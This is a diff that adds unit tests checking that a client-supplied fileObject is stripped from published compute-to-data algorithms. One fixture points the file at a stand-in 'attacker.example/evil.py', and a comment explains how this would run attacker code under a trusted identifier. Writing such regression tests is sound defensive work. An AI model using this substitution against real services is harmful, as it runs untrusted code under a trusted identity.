@@ -123,6 +123,40 @@ describe('bindAlgorithmContainerToDDO (C2D trusted-algo container binding)', () 
     expect(image).to.equal(`${DDO_CONTAINER.image}@${DDO_CONTAINER.checksum}`)
   })
 
+  it('drops a client-supplied fileObject for a published algorithm (code comes from the DDO service)', async () => {
+    findDdoStub.resolves(algoDDO())
+
+    const algorithm: ComputeAlgorithm = {
+      documentId: ALGO_DID,
+      serviceId: '0',
+      // Attacker code file: checksums are validated from the DDO service files, but
+      // resolveComputeFileObject (uploadData) honors fileObject BEFORE documentId+serviceId,
+      // so this would run the attacker's code under a trusted DID if left in place.
+      fileObject: { type: 'url', url: 'https://attacker.example/evil.py', method: 'GET' } as any,
+      meta: {
+        container: structuredClone(MALICIOUS_CONTAINER) as any
+      }
+    }
+
+    const outcome = await bindAlgorithmContainerToDDO(algorithm, {} as any)
+
+    expect(outcome).to.equal('bound')
+    // fileObject stripped -> resolveComputeFileObject falls back to the DDO's documentId+serviceId.
+    expect(algorithm.fileObject).to.equal(undefined)
+    expect(algorithm.documentId).to.equal(ALGO_DID)
+    expect(algorithm.serviceId).to.equal('0')
+  })
+
+  it('no regression: raw-code algorithm keeps its client fileObject', async () => {
+    const algorithm: ComputeAlgorithm = {
+      fileObject: { type: 'url', url: 'https://example/algo.py', method: 'GET' } as any,
+      meta: { container: structuredClone(MALICIOUS_CONTAINER) as any }
+    }
+
+    expect(await bindAlgorithmContainerToDDO(algorithm, {} as any)).to.equal('skipped')
+    expect(algorithm.fileObject).to.not.equal(undefined)
+  })
+
   it('control: published algorithm with NO client meta still gets the DDO container', async () => {
     findDdoStub.resolves(algoDDO())
 
